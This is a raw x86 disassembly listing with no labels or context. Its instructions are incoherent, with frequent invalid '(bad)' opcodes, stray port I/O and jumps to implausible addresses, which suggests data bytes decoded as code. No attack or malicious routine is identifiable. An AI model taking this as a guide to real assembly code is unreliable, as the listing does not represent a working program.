  4101fc:	lods   eax,DWORD PTR ds:[esi]
  4101fd:	dec    edi
  4101fe:	out    0x75,eax
  410200:	add    BYTE PTR [eax],al
  410202:	(bad)  
  410203:	and    esi,edi
  410205:	(bad)  
  410206:	or     al,al
  410208:	shl    ecx,0x32
  41020b:	xchg   ebp,eax
  41020c:	enter  0x3316,0x92
  410210:	sbb    esp,ebp
  410212:	xor    dl,BYTE PTR [ecx*4+0x18a73b90]
  410219:	jb     0x4101cb
  41021b:	adc    BYTE PTR [ecx+ebp*8],al
  41021e:	xor    cl,BYTE PTR [ebx+0x20f6d185]
  410224:	(bad)  
  410225:	sub    DWORD PTR [esi+ebp*2+0x1432e51b],edi
  41022c:	mov    DWORD PTR [edi+0x45],ebp
  41022f:	sbb    BYTE PTR [eax],al
  410231:	jmp    0xed5898e1
  410236:	xor    dl,BYTE PTR [edx+ecx*4]
  410239:	fnstenv [eax]
  41023b:	inc    esi
  41023c:	std    
  41023d:	stos   DWORD PTR es:[edi],eax
  41023e:	lods   eax,DWORD PTR ds:[esi]
  41023f:	adc    BYTE PTR [ecx],al
  410241:	pop    edi
  410242:	sbb    DWORD PTR [eax],ebx
  410244:	add    cl,ch
  410246:	loope  0x410243
  410248:	mov    ah,BYTE PTR [edi+0x3d]
  41024b:	sbb    BYTE PTR [eax],al
  41024d:	jmp    0xe55898ff
  410252:	xor    dl,BYTE PTR [eax+eax*2]
  410255:	jo     0x41026e
  410257:	std    
  410258:	add    ebp,ecx
  41025a:	xor    cl,BYTE PTR [ebx+0x207ed985]
  410260:	(bad)  
  410261:	(bad)  
  410262:	test   DWORD PTR [eax],0xe904
  410268:	xor    cl,BYTE PTR [esi+0x1f00eb0f]
  41026e:	shl    DWORD PTR [ecx+0x45],0x13
  410272:	mov    gs,ebp
  410274:	push   esi
  410275:	and    dh,bh
  410277:	add    BYTE PTR [ebp+0x68868aff],cl
  41027d:	and    dh,bh
  41027f:	call   ecx
  410281:	mov    eax,ds:0x14480416
  410286:	inc    eax
  410287:	mov    DWORD PTR [esi+0x180003fc],eax
  41028d:	xchg   ecx,eax
  41028e:	test   BYTE PTR [eax],dl
  410290:	or     al,0x14
  410292:	add    BYTE PTR [ebx+0x4008e],cl
  410298:	sbb    BYTE PTR [esi-0x19d5fdf2],cl
  41029e:	ror    BYTE PTR [eax+0x1c8e18d8],0xc
  4102a5:	adc    al,0x0
  4102a7:	jne    0x4102da
  4102a9:	mov    eax,DWORD PTR [eax+edx*1-0x76ffec34]
  4102b0:	dec    esi
  4102b1:	sti    
  4102b2:	add    eax,DWORD PTR [eax]
  4102b4:	enter  0x8753,0xae
  4102b8:	aam    0x1f
  4102ba:	(bad)  
  4102bb:	inc    DWORD PTR [ecx-0x5f]
  4102be:	push   cs
  4102bf:	add    al,0xc8
  4102c1:	adc    ecx,DWORD PTR [ebx-0x1e01f7a]
  4102c7:	(bad)  
  4102c8:	call   0xcf0200
  4102cd:	add    BYTE PTR [edi+ebx*1+0x13dfffe],ah
  4102d4:	mov    eax,DWORD PTR [esi-0x1e068]
  4102da:	add    DWORD PTR [ecx+0x13980416],esp
  4102e0:	inc    eax
  4102e1:	mov    esi,esi
  4102e3:	push   es
  4102e4:	add    al,0x0
  4102e6:	mov    BYTE PTR [eax+0x135c1084],dl
  4102ec:	add    BYTE PTR [ebx+0x3face],cl
  4102f2:	xor    DWORD PTR ds:0xbf301f52,ebp
  4102f8:	push   ss
  4102f9:	add    al,0x31
  4102fb:	sub    eax,0xb7ba18af
  410300:	adc    al,BYTE PTR [ecx+esi*1]
  410303:	sub    eax,0x3919858b
  410308:	add    al,BYTE PTR [eax]
  41030a:	jno    0x4102b0
  41030c:	sbb    ebp,DWORD PTR fs:0xb789022d
  410313:	sbb    al,0xfe
  410315:	call   DWORD PTR [esi]
  410317:	mov    dl,0x7c
  410319:	pop    ss
  41031a:	xor    eax,0x51d0022d
  41031f:	sub    al,0x84
  410321:	sbb    esi,DWORD PTR ds:0x1875022d
  410327:	mov    dl,0x7c
  410329:	sysexit 
  41032b:	sub    eax,0x14af8902
  410330:	add    BYTE PTR [eax],al
  410332:	add    BYTE PTR [eax],al
  410334:	xor    ebp,ebp
  410336:	mov    ch,BYTE PTR [ebp+0x23935]
  41033c:	mov    eax,0x310413ae
  410341:	sub    eax,0x3119b587
  410346:	add    al,BYTE PTR [eax]
  410348:	loope  0x410360
  41034a:	(bad)  
  41034b:	pop    esp
  41034c:	jae    0x410372
  41034e:	add    cl,BYTE PTR [ebx+0x55fe58ed]
  410354:	push   es
  410355:	mov    dl,0xb7
  410357:	and    eax,DWORD PTR [ecx-0x4e]
  41035a:	xor    bh,BYTE PTR [ecx+esi*4]
  41035d:	sub    al,0x2
  41035f:	add    BYTE PTR [edx],al
  410361:	inc    ecx
  410362:	jg     0x410362
  410364:	xor    eax,0xaf3b0b1a
  410369:	pop    eax
  41036a:	(bad)  
  41036b:	jmp    FWORD PTR [esi+0x13]
  41036e:	(bad)  
  410370:	pop    edi
  410371:	cmp    eax,DWORD PTR [ecx]
  410373:	inc    esp
  410374:	mov    bl,0x33
  410376:	out    dx,al
  410377:	aam    0xb3
  410379:	push   ebx
  41037a:	jecxz  0x410351
  41037c:	jo     0x410389
  41037e:	jmp    0xe538b07b
  410383:	add    esi,DWORD PTR [ecx]
  410385:	test   al,0xf3
  410387:	div    BYTE PTR [esi-0x5dfc16ed]
  41038d:	pop    ss
  41038e:	push   0x25
  410390:	xor    BYTE PTR [ecx],ch
  410392:	clc    
  410393:	neg    BYTE PTR [esi]
  410395:	sbb    ecx,ebp
  410397:	add    eax,DWORD PTR [eax]
  410399:	add    BYTE PTR [ebx+0xef69e13],ah
  41039f:	mov    eax,ds:0x138303e8
  4103a4:	scas   al,BYTE PTR es:[edi]
  4103a5:	inc    edx
  4103a6:	push   ss
  4103a7:	or     eax,0x11b6809a
  4103ac:	cdq    
  4103ad:	sub    edx,DWORD PTR [edx+ebx*1]
  4103b0:	in     eax,0x34
  4103b2:	jg     0x41033d
  4103b4:	scas   al,BYTE PTR es:[edi]
  4103b5:	mov    BYTE PTR [esi],al
  4103b7:	sub    eax,0x1dd739f4
  4103bc:	pop    ebx
  4103bd:	mov    edi,0xd5220a26
  4103c2:	fs push edx
  4103c4:	lock add esp,DWORD PTR [esi+0x2c]
  4103c8:	in     al,0x39
  4103ca:	mov    bh,0x1d
  4103cc:	or     eax,0x4718ee81
  4103d1:	inc    edx
  4103d2:	cs adc al,0x3a
  4103d5:	mov    edx,edi
  4103d7:	mul    eax
  4103d9:	into   
  4103da:	cld    
  4103db:	mov    BYTE PTR [edi-0x13133380],dl
  4103e1:	add    esi,DWORD PTR [ecx]
  4103e3:	adc    al,0x16
  4103e5:	add    eax,0xe7fff9b5
  4103ea:	xor    dl,BYTE PTR [ecx+eax*4]
  4103ed:	jb     0x4103a1
  4103ef:	sbb    eax,0xd4a1e9fe
  4103f4:	sbb    ch,0x7e
  4103f7:	add    eax,0x3558da04
  4103fc:	ss push edx
  4103fe:	add    BYTE PTR [eax],al
  410400:	add    eax,0x1a378a1e
  410405:	in     eax,dx
  410406:	cli    
  410407:	ds add eax,0xf841cd8a
  41040d:	sbb    bh,dh
  41040f:	cs mov eax,0xb80123d0
  410415:	xchg   BYTE PTR [edi],cl
  410417:	in     eax,0x32
  410419:	adc    al,0x8a
  41041b:	and    dh,dh
  41041d:	adc    eax,DWORD PTR [edx]
  41041f:	and    BYTE PTR [eax],dh
  410421:	push   ebx
  410422:	pop    esi
  410423:	jno    0x410455
  410425:	sbb    eax,0x1cfed985
  41042a:	(bad)  
  41042b:	pusha  
  41042c:	pushf  
  41042d:	lock add ebp,ecx
  410430:	xor    bh,BYTE PTR [esi+0x156f425c]
  410436:	add    BYTE PTR [edx+0x72],ch
  410439:	push   ds
  41043a:	add    BYTE PTR [edi-0x16ffe7bf],dl
  410440:	mov    cl,0xad
  410442:	or     BYTE PTR [esp+esi*1],bh
  410445:	mov    DWORD PTR [ebp+0x1436d9],eax
  41044b:	pusha  
  41044c:	stos   DWORD PTR es:[edi],eax
  41044d:	add    al,0x4
  41044f:	jmp    0x57c9d886
  410454:	inc    ecx
  410455:	sbb    BYTE PTR [eax],al
  410457:	jmp    0xed509b79
  41045c:	xor    dl,BYTE PTR [ebx+ecx*4]
  41045f:	addr16 cmp eax,0x18
  410465:	add    BYTE PTR [eax-0x3efdf962],bl
  41046b:	loope  0x41042c
  41046d:	mov    BYTE PTR [eax+0x541cbe17],dl
  410473:	adc    BYTE PTR [eax],al
  410475:	jne    0x4104a8
  410477:	popf   
  410478:	test   BYTE PTR [eax],dl
  41047a:	push   esp
  41047b:	adc    BYTE PTR [eax],al
  41047d:	mov    esi,eax
  41047f:	(bad)  
  410481:	add    BYTE PTR [eax+0x50],bl
  410484:	xchg   DWORD PTR [esi+0x144c],ebp
  41048a:	ror    DWORD PTR [ecx+0x1048040e],0x8b
  410491:	xchg   BYTE PTR [eax],al
  410493:	adc    al,0x0
  410495:	add    BYTE PTR [eax+0x30],ch
  410498:	mov    ebx,edx
  41049a:	dec    ecx
  41049b:	cli    
  41049c:	push   es
  41049d:	or     DWORD PTR [edx+0x12],0x52
  4104a1:	mov    ebp,DWORD PTR [esi]
  4104a3:	clc    
  4104a4:	(bad)  
  4104a5:	cli    
  4104a6:	das    
  4104a7:	out    0x89,eax
  4104a9:	xchg   al,bl
  4104ab:	adc    eax,DWORD PTR [eax]
  4104ad:	add    BYTE PTR [eax-0x27fe47f8],dl
  4104b3:	pop    ss
  4104b4:	add    BYTE PTR [ecx],al
  4104b6:	push   esi
  4104b7:	pop    es
  4104b8:	add    al,0x0
  4104ba:	enter  0x9c98,0x24
  4104be:	les    edx,FWORD PTR [edi]
  4104c0:	add    BYTE PTR [ecx-0x1681d],al
  4104c6:	fsub   DWORD PTR [edx+0x16]
  4104c9:	add    DWORD PTR [eax],0x0
  4104cc:	ins    BYTE PTR es:[edi],dx
  4104cd:	sub    al,0x16
  4104cf:	add    dl,BYTE PTR [ebx+0x5b]
  4104d2:	and    bl,BYTE PTR [eax]
  4104d4:	dec    ecx
  4104d5:	fwait
  4104d6:	int3   
  4104d7:	call   0x3eee03
  4104dc:	pop    edi
  4104dd:	inc    esi
  4104de:	pop    ebx
  4104df:	pop    ebx
  4104e0:	xor    DWORD PTR [edi-0x6],ebp
  4104e3:	push   DWORD PTR [ecx+0x31050286]
  4104e9:	sub    eax,0xf14803b4
  4104ee:	out    0x17,eax
  4104f0:	mov    al,0xa6
  4104f2:	add    bh,BYTE PTR [ebp+0x31]
  4104f5:	sub    eax,0x691803b4
  4104fa:	out    0x17,al
  4104fc:	stos   BYTE PTR es:[edi],al
  4104fd:	imul   esp,esi,0x40b60017
  410503:	out    0xdd,eax
  410505:	(bad)  
  410506:	xor    esi,edi
  410508:	out    0x72,al
  41050a:	iret   
  41050b:	pop    edx
  41050c:	jae    0x410533
  41050e:	add    al,bh
  410510:	scas   eax,DWORD PTR es:[edi]
  410511:	adc    eax,0x2c310008
  410516:	add    al,BYTE PTR [eax]
  410518:	xor    DWORD PTR [ebp+ebp*1+0x22d317f],ebp
  41051f:	jae    0x410589
  410521:	scas   al,BYTE PTR es:[edi]
  410522:	scas   al,BYTE PTR es:[edi]
  410523:	and    ebp,DWORD PTR [ecx]
  410525:	xor    DWORD PTR [ebp-0x194cb5bf],esi
  41052b:	add    esi,DWORD PTR [ecx]
  41052d:	sub    eax,0x39b6
  410532:	or     DWORD PTR [edi],esi
  410534:	sub    al,0xfe
  410536:	out    dx,al
  410537:	mov    ch,0x40
  410539:	out    0x32,eax
  41053b:	aaa    
  41053c:	xor    dh,bh
  41053e:	stos   BYTE PTR es:[edi],al
  41053f:	push   0x1b
  410541:	int3   
  410542:	fadd   DWORD PTR [ecx+0x30]
  410545:	mov    DWORD PTR [ebp+0x11],esi
  410548:	or     al,0x8b
  41054a:	mov    bh,0x3c
  41054c:	push   es
  41054d:	add    BYTE PTR [ecx],dh
  41054f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410550:	push   esp
  410551:	and    esi,DWORD PTR [eax]
  410553:	das    
  410554:	push   esp
  410555:	add    DWORD PTR [ebx+0x9],esi
  410558:	jl     0x41055a
  41055a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41055b:	adc    ebp,DWORD PTR [edi+0x14]
  41055e:	xor    eax,0xb47ae914
  410563:	out    dx,eax
  410564:	in     al,dx
  410565:	add    esi,DWORD PTR [ecx]
  410567:	mov    edx,0xb70cd2b
  41056c:	jmp    0xe75b74f5
  410571:	jno    0x41058d
  410573:	adc    cl,ch
  410575:	add    edi,DWORD PTR [edx+ebp*4-0x70b64921]
  41057c:	outs   dx,BYTE PTR ds:[esi]
  41057d:	adc    al,0x35
  41057f:	adc    al,0xe9
  410581:	jp     0x41052f
  410583:	sti    
  410584:	in     al,dx
  410585:	add    esi,DWORD PTR [ecx]
  410587:	aam    0x5f
  410589:	bound  ebp,QWORD PTR [edx]
  41058b:	adc    cl,ch
  41058d:	add    ebp,DWORD PTR [eax+0x3107d891]
  410593:	adc    al,0x62
  410595:	mov    al,BYTE PTR [eax]
  410597:	add    BYTE PTR [esi+0x10],al
  41059a:	jmp    0xeb45c0a2
  41059f:	push   ebp
  4105a0:	sbb    al,0x57
  4105a2:	jo     0x4105b8
  4105a4:	xor    BYTE PTR [edx-0xc],bl
  4105a7:	pop    es
  4105a8:	xor    DWORD PTR [esp+edx*4],edx
  4105ab:	or     bh,BYTE PTR [edx+0x3107d892]
  4105b1:	adc    al,0x70
  4105b3:	mov    bl,BYTE PTR [esi]
  4105b5:	adc    cl,ch
  4105b7:	add    esi,DWORD PTR [ecx-0x75]
  4105ba:	adc    BYTE PTR ds:0xb47ae914,ch
  4105c1:	add    al,0xe5
  4105c3:	add    esi,DWORD PTR [ecx]
  4105c5:	lea    ebp,[esi+0xb]
  4105c8:	xor    eax,0x2653e914
  4105cd:	frstor [esi-0x19]
  4105d0:	xor    dl,BYTE PTR [ecx+ebp*8]
  4105d3:	mov    bh,0x40
  4105d5:	(bad)  
  4105d6:	jmp    FWORD PTR [ecx+0x6a0730f3]
  4105dc:	repnz adc eax,0x1cb89150
  4105e2:	(bad)  
  4105e3:	sahf   
  4105e4:	adc    eax,0x32ed0f87
  4105e9:	adc    al,0x88
  4105eb:	lock sbb dl,BYTE PTR [eax+eax*1]
  4105ef:	jmp    0xd9c71926
  4105f4:	cs adc al,0x0
  4105f7:	pusha  
  4105f8:	shl    ch,0x3
  4105fb:	jmp    0x93730600
  410600:	cli    
  410601:	imul   esi,DWORD PTR [edx],0x2ada0014
  410607:	xchg   ebp,eax
  410608:	imul   ecx,DWORD PTR ds:0xb58b163d,0x4e
  41060f:	add    DWORD PTR [edx+0x72],edx
  410612:	lock xor BYTE PTR [ebx+0x40],ah
  410616:	add    DWORD PTR [edx],ebx
  410618:	pop    esi
  410619:	xchg   edi,eax
  41061a:	(bad)  
  41061b:	mov    ebp,0x9332e1c1
  410620:	cli    
  410621:	jmp    0x9b411a5d
  410626:	cs jmp 0x41066c
  410629:	int    0x3a
  41062b:	xchg   ebx,eax
  41062c:	cli    
  41062d:	jmp    0x7c3f1f09
  410632:	fwait
  410633:	jmp    0x410678
  410635:	lds    ebp,FWORD PTR [edx]
  410637:	lea    edx,[ebx-0x33]
  41063a:	cmp    al,dh
  41063c:	mov    bl,BYTE PTR [edi]
  41063e:	dec    edx
  41063f:	fdiv   st(0),st
  410641:	out    0xe,al
  410643:	mov    edx,0x52ea3c5d
  410648:	pop    es
  410649:	jmp    0xe55c6083
  41064e:	xor    dl,BYTE PTR [esi*2-0x7b622f00]
  410655:	adc    ah,cl
  410657:	adc    al,0x0
  410659:	mov    DWORD PTR [esi],ebx
  41065b:	or     BYTE PTR [eax+eax*1],al
  41065e:	cwde   
  41065f:	push   esp
  410660:	xchg   DWORD PTR [esi+0xc340000],ebp
  410666:	add    BYTE PTR [eax],al
  410668:	and    DWORD PTR [edx+0x1498040e],edx
  41066e:	mov    eax,DWORD PTR [esi+0x1080]
  410674:	cwde   
  410675:	das    
  410676:	(bad)  
  410677:	mov    ebp,0x1054
  41067c:	ins    DWORD PTR es:[edi],dx
  41067d:	pop    es
  41067e:	mov    eax,DWORD PTR [esi+0x1088]
  410684:	loope  0x410617
  410686:	push   ss
  410687:	add    al,0x48
  410689:	adc    al,0x40
  41068b:	mov    DWORD PTR [esi+0x58000403],esi
  410691:	xchg   edi,eax
  410692:	test   BYTE PTR [eax],dl
  410694:	dec    esp
  410695:	adc    al,0x0
  410697:	mov    ecx,esi
  410699:	pop    es
  41069a:	add    al,0x0
  41069c:	sbb    ah,al
  41069e:	push   ds
  41069f:	mov    edi,DWORD PTR [edi+ebp*1-0x295cadea]
  4106a6:	out    0xd4,al
  4106a8:	push   eax
  4106a9:	out    0xfd,eax
  4106ab:	pop    edi
  4106ac:	mov    BYTE PTR [ecx+ebx*2-0x3e],0x10
  4106b1:	adc    al,0x8b
  4106b3:	inc    esp
  4106b4:	in     al,dx
  4106b5:	jge    0xffbd0f4b
  4106bb:	jmp    DWORD PTR [ebx-0x27fbfd80]
  4106c1:	adc    esi,DWORD PTR [esi+0x19]
  4106c4:	arpl   WORD PTR [eax+0x40a],bx
  4106ca:	enter  0x3b13,0xc1
  4106ce:	xor    DWORD PTR [edi+0x6bf02b08],esi
  4106d4:	push   es
  4106d5:	add    BYTE PTR [edx],cl
  4106d7:	ins    BYTE PTR es:[edi],dx
  4106d8:	pop    es
  4106d9:	add    BYTE PTR [ecx+0x2c],cl
  4106dc:	add    al,dl
  4106de:	xor    eax,0x73bff12d
  4106e3:	xor    DWORD PTR [edx],eax
  4106e5:	or     DWORD PTR [ebp-0x55ab2ee3],0x9
  4106ec:	call   0x497aee10
  4106f1:	mov    al,BYTE PTR [eax+0x555b7cde]
  4106f7:	cmp    eax,0x354d5b7b
  4106fc:	jmp    0x4106ab
  4106fe:	cmp    DWORD PTR [ecx],ebp
  410700:	add    al,BYTE PTR [eax]
  410702:	ss stos BYTE PTR es:[edi],al
  410704:	popa   
  410705:	call   FWORD PTR [esi+0x2d]
  410708:	sbb    DWORD PTR [edx],ecx
  41070a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41070b:	xchg   ecx,eax
  41070c:	out    0xff,al
  41070e:	dec    esi
  41070f:	sub    eax,0x10cd8d02
  410714:	add    al,0x8b
  410716:	mov    bh,0x29
  410718:	push   es
  410719:	add    BYTE PTR [ecx],dh
  41071b:	test   al,0x7a
  41071d:	call   DWORD PTR [esi-0x6c4fdd4]
  410723:	pop    esi
  410724:	adc    eax,0x620af8b
  410729:	add    BYTE PTR [ecx],dh
  41072b:	xor    al,BYTE PTR [ebx+0x75]
  41072e:	add    BYTE PTR [eax],al
  410730:	xor    eax,0x3aea4352
  410735:	push   edx
  410736:	inc    ebx
  410737:	add    al,0x31
  410739:	test   DWORD PTR [ebx],eax
  41073b:	add    BYTE PTR [edx],cl
  41073d:	sub    esi,ecx
  41073f:	mov    edi,0x3faaeba
  410744:	xor    DWORD PTR ds:0x1440b5fd,ebp
  41074a:	div    BYTE PTR [ebp+0x69]
  41074d:	adc    eax,0xfa4d872
  410752:	bound  eax,QWORD PTR [eax]
  410754:	mov    ebx,0x2a7b0e8a
  410759:	(bad)  
  41075a:	jno    0x4106e2
  41075c:	cs adc cl,ch
  41075f:	add    edi,DWORD PTR [esi]
  410761:	pop    esi
  410762:	fdivr  st,st(4)
  410764:	(bad)  
  410766:	out    0x78,eax
  410768:	jmp    0xe50f:0xbc78ec7d
  41076f:	add    esi,DWORD PTR [ecx]
  410771:	(bad)  
  410772:	cld    
  410773:	or     cl,0x14
  410776:	jmp    0x7756387e
  41077b:	or     BYTE PTR ds:0xbf02e914,ch
  410781:	or     ebp,ebp
  410783:	add    esi,DWORD PTR [ecx]
  410785:	mov    esp,DWORD PTR [esi+0x8]
  410788:	xor    eax,0x6e78e914
  41078d:	jmp    0x82e9:0x1435006e
  410794:	add    BYTE PTR [eax],al
  410796:	dec    ecx
  410797:	adc    eax,ecx
  410799:	add    dh,BYTE PTR [ecx]
  41079b:	sahf   
  41079c:	in     eax,dx
  41079d:	mov    ebx,0x7ec8da9
  4107a2:	xor    DWORD PTR [eax+esi*8],edx
  4107a5:	pop    ebp
  4107a6:	cs adc cl,ch
  4107a9:	add    ebp,DWORD PTR [esi]
  4107ab:	xchg   edx,eax
  4107ac:	xchg   edx,eax
  4107ad:	sub    al,0x17
  4107af:	push   ss
  4107b0:	jno    0x41077a
  4107b2:	push   edx
  4107b3:	in     al,0x52
  4107b5:	add    al,0x8e
  4107b7:	adc    ebp,ecx
  4107b9:	call   0x7b2fa6ae
  4107be:	(bad)  
  4107bf:	lock mov eax,0xff913918
  4107c5:	lock xor eax,DWORD PTR ds:0x14322386
  4107cc:	add    dh,dh
  4107ce:	pop    esp
  4107cf:	sar    bh,1
  4107d1:	in     eax,dx
  4107d2:	inc    esp
  4107d3:	enter  0x6200,0xee
  4107d7:	pop    DWORD PTR [ebx]
  4107d9:	(bad)  
  4107da:	into   
  4107db:	lea    edi,[edx]
  4107dd:	ret    0x91b5
  4107e0:	mov    dl,0xe8
  4107e2:	xor    dl,BYTE PTR [ebx+ecx*4]
  4107e5:	addr16 xchg edx,eax
  4107e7:	adc    DWORD PTR [eax],eax
  4107e9:	jmp    0xae50190d
  4107ee:	outs   dx,BYTE PTR ds:[esi]
  4107ef:	icebp  
  4107f0:	sbb    ebp,ecx
  4107f2:	mov    dl,BYTE PTR ds:0xa2efd2fe
  4107f8:	cmp    DWORD PTR [edx+0x0],esp
  4107fb:	add    BYTE PTR [ebp-0x26],cl
  4107fe:	cli    
  4107ff:	std    
  410800:	jle    0x41078a
  410802:	xchg   cl,ch
  410804:	retf   0x14
  410807:	mov    dl,0xac
  410809:	adc    DWORD PTR [ecx+ebp*8],eax
  41080c:	xor    bl,BYTE PTR [esi+0x9ac7217]
  410812:	add    al,0xe9
  410814:	xor    bl,cl
  410816:	neg    edi
  410818:	cs jmp 0xea7f4b15
  41081e:	imul   DWORD PTR [eax-0x13]
  410821:	adc    al,0x66
  410823:	call   0xfa42315a
  410828:	push   ebp
  410829:	mov    al,BYTE PTR ds:0x8c5d0e62
  41082f:	in     eax,dx
  410830:	adc    eax,0x4a9ac4da
  410835:	fcom   QWORD PTR [ebx-0x33]
  410838:	out    0x9e,al
  41083a:	add    esp,DWORD PTR [eax-0x1a]
  41083d:	lock sub eax,DWORD PTR [eax]
  410840:	repz jmp 0x410850
  410843:	test   dl,cl
  410845:	adc    DWORD PTR [eax],eax
  410847:	add    BYTE PTR [ebp-0x74],cl
  41084a:	(bad)  
  41084b:	dec    eax
  41084d:	adc    BYTE PTR [ebx-0x7827bc33],cl
  410853:	dec    esp
  410854:	xor    al,0x4
  410856:	cmp    ecx,DWORD PTR [esp+esi*1+0x3c]
  41085a:	or     eax,0xf2287
  41085f:	add    BYTE PTR [eax],al
  410861:	add    BYTE PTR [ebx+0x5c],al
  410864:	and    dl,BYTE PTR [eax]
  410866:	and    al,BYTE PTR [ecx+eax*1]
  410869:	cmp    al,BYTE PTR [ebx+ebx*1-0x2]
  41086d:	mov    bh,BYTE PTR [esp+esi*1]
  410870:	adc    bh,BYTE PTR [ebx+0x108a]
  410876:	and    al,0x1c
  410878:	cmp    DWORD PTR [esi-0x1eb8c],ecx
  41087e:	pop    edi
  41087f:	xchg   ebx,eax
  410880:	enter  0x8800,0x10
  410884:	mov    edx,DWORD PTR [esp+esi*2+0x20]
  410888:	cmp    edx,ebx
  41088a:	imul   ebp,DWORD PTR [edi],0xffffff8b
  41088d:	dec    ebp
  41088e:	dec    edx
  41088f:	xchg   ebp,eax
  410890:	out    0x2b,al
  410892:	jl     0x4108c8
  410894:	mov    dl,BYTE PTR es:[ebx+ebx*1+0x635939fe]
  41089c:	add    al,0x43
  41089e:	mov    DWORD PTR ds:0x94fa72d8,esp
  4108a4:	dec    edx
  4108a5:	and    al,0x4
  4108a7:	xchg   ebx,eax
  4108a8:	imul   esp,DWORD PTR [eax+esi*1],0x940fd803
  4108af:	cmp    ebp,edi
  4108b1:	dec    DWORD PTR [eax]
  4108b3:	add    ebx,DWORD PTR [edx+0x24]
  4108b6:	or     dh,al
  4108b8:	inc    esi
  4108b9:	push   ebx
  4108ba:	xor    esp,ecx
  4108bc:	jle    0x41088b
  4108be:	or     DWORD PTR [eax+0x2e],esi
  4108c1:	(bad)  
  4108c2:	test   BYTE PTR [esi+0x23b8],0x41
  4108c9:	xchg   al,dl
  4108cb:	and    ecx,DWORD PTR [ecx-0x54]
  4108ce:	ror    DWORD PTR [edx-0x18e38911],cl
  4108d4:	mov    dh,0xf7
  4108d6:	sub    bh,dh
  4108d8:	sbb    ah,ch
  4108da:	jle    0x410927
  4108dc:	or     eax,0x79ed0711
  4108e1:	xor    bl,BYTE PTR [eax]
  4108e3:	ret    
  4108e4:	rcr    BYTE PTR [bx+si],cl
  4108e7:	mov    bl,BYTE PTR ds:0xabc0dc19
  4108ed:	(bad)  
  4108ee:	jle    0x4108b1
  4108f0:	jo     0x4108c7
  4108f2:	or     al,BYTE PTR [ebx]
  4108f4:	jae    0x4108f4
  4108f6:	mov    ebp,0x49f62123
  4108fb:	jne    0x41092c
  4108fd:	je     0x4108b4
  4108ff:	and    ebx,DWORD PTR [ecx]
  410901:	xchg   esi,eax
  410902:	mov    ebx,0xfde1a73a
  410907:	jmp    FWORD PTR [esi+0x8]
  41090a:	rcl    BYTE PTR [edx+0x0],0x76
  41090e:	aaa    
  41090f:	out    0xd2,eax
  410911:	xchg   BYTE PTR [edx],ch
  410913:	(bad)  
  410914:	stos   BYTE PTR es:[edi],al
  410915:	rcr    ebp,1
  410917:	bt     DWORD PTR [ebp+0x7e],0x43
  41091c:	or     eax,0xaa4fd405
  410921:	xor    ebx,DWORD PTR [ecx]
  410923:	dec    edi
  410924:	cmp    ebx,DWORD PTR [edx+0x2a]
  410927:	mov    bh,cl
  410929:	and    eax,0x8a37
  41092e:	xchg   ebp,eax
  41092f:	and    esp,ebx
  410931:	mov    bh,0xca
  410933:	xchg   esi,eax
  410934:	pop    ebx
  410935:	sub    DWORD PTR [esi],ebx
  410937:	adc    al,0x10
  410939:	jle    0x410933
  41093b:	aam    0x10
  41093d:	or     dh,BYTE PTR [edx]
  41093f:	fsubp  st(2),st
  410941:	cmp    esp,DWORD PTR ds:[eax-0x3d]
  410945:	adc    eax,DWORD PTR [ebx+0x12cf7220]
  41094b:	sub    BYTE PTR [eax-0x31],dh
  41094e:	adc    ch,BYTE PTR [eax+eiz*2]
  410951:	(bad)  
  410952:	adc    ah,BYTE PTR [esp+ebx*2]
  410955:	adc    dh,0x7a
  410958:	call   0xe3db1360
  41095d:	inc    esi
  41095f:	adc    bl,BYTE PTR [esi+0xc]
  410962:	stos   BYTE PTR es:[edi],al
  410963:	cdq    
  410964:	(bad)  
  410966:	mov    dh,0x12
  410968:	add    ebp,DWORD PTR [esp]
  41096b:	sbb    BYTE PTR [edx],dl
  41096d:	sub    al,0x9b
  41096f:	pop    ds
  410970:	add    ch,BYTE PTR [ecx+esi*4]
  410973:	(bad)  
  410975:	fwait
  410976:	xor    DWORD PTR [edx+edx*4],edx
  410979:	push   es
  41097a:	inc    edx
  41097b:	adc    esi,DWORD PTR [ebx-0x6]
  41097e:	mov    ebx,0xb47d504f
  410983:	xor    esp,ebx
  410985:	add    esi,DWORD PTR [ecx]
  410987:	pop    ss
  410988:	scas   al,BYTE PTR es:[edi]
  410989:	test   edx,ebx
  41098b:	aaa    
  41098c:	fild   DWORD PTR [edx]
  41098e:	frstor ds:0x296c
  410994:	das    
  410995:	cdq    
  410996:	sub    eax,0x5312572a
  41099b:	cld    
  41099c:	mov    ecx,0xb80c035f
  4109a1:	outs   dx,DWORD PTR ds:[esi]
  4109a2:	or     edx,DWORD PTR [edx+ebp*4]
  4109a5:	push   edi
  4109a6:	add    esp,eax
  4109a8:	stos   DWORD PTR es:[edi],eax
  4109a9:	or     edx,DWORD PTR [si]
  4109ac:	mov    edx,0x860c0360
  4109b1:	jb     0x4109b3
  4109b3:	xchg   esp,eax
  4109b4:	fwait
  4109b5:	popa   
  4109b6:	add    al,0x60
  4109b8:	adc    eax,0x252d816f
  4109bd:	(bad)  
  4109be:	adc    cl,ch
  4109c0:	lods   eax,DWORD PTR ds:[esi]
  4109c1:	std    
  4109c2:	cmp    BYTE PTR [edx-0x37],ch
  4109c5:	xor    eax,0x9ee0e944
  4109ca:	out    dx,eax
  4109cb:	jl     0x4109b8
  4109cd:	inc    esi
  4109ce:	rcr    BYTE PTR [edi+0x2b38d5ad],0x2d
  4109d5:	adc    al,0x89
  4109d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109d8:	not    BYTE PTR [ecx-0x7d]
  4109db:	test   eax,0xb1811b9f
  4109e0:	sbb    DWORD PTR [edi-0x7f],ebp
  4109e3:	lods   eax,DWORD PTR ds:[esi]
  4109e4:	retf   0x18d3
  4109e7:	jmp    0x2d656721
  4109ec:	fdiv   QWORD PTR cs:[edi+ecx*8+0x25]
  4109f1:	gs and al,0x25
  4109f4:	push   ds
  4109f5:	jecxz  0x410a6b
  4109f7:	mov    DWORD PTR [eax],0x14971b00
  4109fd:	in     eax,dx
  4109fe:	xor    dl,BYTE PTR [eax+ecx*2]
  410a01:	jo     0x4109b3
  410a03:	xor    DWORD PTR [ecx+ebp*8],eax
  410a06:	xor    bl,BYTE PTR [ebx+0x1176f98e]
  410a0c:	inc    BYTE PTR [ecx+0x48]
  410a0f:	push   cs
  410a10:	out    dx,eax
  410a11:	push   edx
  410a12:	pop    ebp
